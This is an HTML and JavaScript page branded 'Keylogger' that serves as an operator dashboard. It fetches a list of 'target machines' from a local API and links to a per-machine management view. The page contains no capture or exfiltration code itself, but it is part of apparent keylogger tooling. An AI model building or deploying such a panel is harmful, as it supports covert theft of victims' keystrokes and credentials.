<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Machine Manager</title>
    <style>
        :root {
            --bg-grad: radial-gradient(1200px 600px at 10% 10%, #7c3aed33 0%, transparent 60%),
                        radial-gradient(1000px 500px at 90% 20%, #06b6d466 0%, transparent 55%),
                        linear-gradient(160deg, #0f172a 0%, #111827 100%);
            --card: rgba(255, 255, 255, 0.14);
            --text: #f8fafc;
            --muted: #cbd5e1;
            --border: rgba(255, 255, 255, 0.22);
            --accent: #8b5cf6;
            --accent-2: #06b6d4;
        }
        * { box-sizing: border-box; }
        html, body { height: 100%; }
        body {
            margin: 0;
            font-family: 'Heebo', ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, "Noto Sans";
            background: var(--bg-grad);
            color: var(--text);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }
        .container {
            width: min(960px, 92vw);
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 18px;
            padding: 24px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.35);
            backdrop-filter: blur(10px);
            text-align: center;
        }
        .logo { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 8px; }
        .logo .logo-mark { font-size: 20px; }
        .logo .logo-text { font-weight: 800; letter-spacing: 0.3px; color: #fff; }
        h1 { margin: 0 0 8px; font-size: 2rem; }
        p { margin: 0 0 16px; color: var(--muted); }

        .computer-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 14px;
            margin-top: 16px;
        }
        .computer-button {
            background: linear-gradient(135deg, var(--accent), var(--accent-2));
            color: #ffffff;
            border: 1px solid rgba(255,255,255,0.25);
            padding: 14px 16px;
            font-size: 1rem;
            border-radius: 12px;
            cursor: pointer;
            text-align: center;
            transition: transform 0.1s ease, box-shadow 0.2s ease, filter 0.2s ease;
            font-weight: 700;
            box-shadow: 0 8px 18px rgba(0,0,0,0.25);
        }
        .computer-button:hover { filter: brightness(1.08); box-shadow: 0 10px 24px rgba(0,0,0,0.3); }
        .computer-button:active { transform: translateY(1px); }

        #feedback-message { margin-top: 14px; font-size: 0.95rem; color: var(--muted); }

        .empty-state {
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 16px 20px;
            margin: 24px auto;
            border: 1px solid var(--border);
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.06);
            color: var(--muted);
            max-width: 420px;
        }
        .empty-state::before {
            content: "ðŸ“­";
            margin-right: 8px;
        }

        .pill-btn {
            border-radius: 999px;
            padding: 10px 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease, filter 0.15s ease;
            border: 1px solid transparent;
            color: #fff;
        }
        .pill-danger {
            background: rgba(239, 68, 68, 0.20);
            color: #fee2e2;
            border-color: rgba(239, 68, 68, 0.35);
        }
        .pill-danger:hover {
            background: rgba(239, 68, 68, 0.35);
            filter: brightness(1.05);
        }

        /* Unify button sizing across views */
        .computer-button,
        .pill-btn {
            min-width: 140px;
            min-height: 44px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo" aria-label="Keylogger">
            <span class="logo-mark" role="img" aria-label="key">ðŸ”‘</span>
            <span class="logo-text">Keylogger</span>
        </div>
        <h1>Select a Machine</h1>
        <p>Click a machine to open its management view.</p>

        <div id="computer-list" class="computer-list">
            </div>

        <div id="feedback-message"></div>
        <br>
        <div>
            <button id="logoutButton" class="pill-btn pill-danger" onclick="window.location.href='http://127.0.0.1:5000'">Log Out</button>
        </div>
    </div>

    <script>
        const API_URL = '/api/getTargetMachinesList';
        const computerListDiv = document.getElementById('computer-list');
        const feedbackMsg = document.getElementById('feedback-message');

        async function fetchAndRenderMachines() {
            try {
                feedbackMsg.textContent = 'Loading machinesâ€¦';
                const response = await fetch(API_URL, { headers: { 'Accept': 'application/json' } });
                if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
                const data = await response.json();
                const machines = Array.isArray(data) ? data : (data.machines || data.list || data.items || []);
                if (!Array.isArray(machines)) throw new Error('Unexpected JSON format from server');
                if (!machines.length) {
                    computerListDiv.innerHTML = '';
                    const empty = document.createElement('div');
                    empty.className = 'empty-state';
                    empty.textContent = 'No machines';
                    computerListDiv.appendChild(empty);
                    feedbackMsg.textContent = '';
                } else {
                    renderButtons(machines);
                    feedbackMsg.textContent = `${machines.length} machines found`;
                }
            } catch (err) {
                console.error('There was a problem with the fetch request:', err);
                computerListDiv.innerHTML = '';
                const empty = document.createElement('div');
                empty.className = 'empty-state';
                empty.textContent = 'No machines';
                computerListDiv.appendChild(empty);
                feedbackMsg.textContent = '';
            }
        }

        function renderButtons(machines) {
            computerListDiv.innerHTML = '';
            machines.forEach((computerName) => {
                const button = document.createElement('button');
                button.className = 'computer-button';
                button.textContent = String(computerName);
                button.onclick = () => goToMachine(computerName);
                computerListDiv.appendChild(button);
            });
        }

        function goToMachine(name) {
            window.location.href = `/individualUinit.html?machine_name=${encodeURIComponent(name)}`;
        }

        window.addEventListener('DOMContentLoaded', fetchAndRenderMachines);
    </script>

</body>
</html>
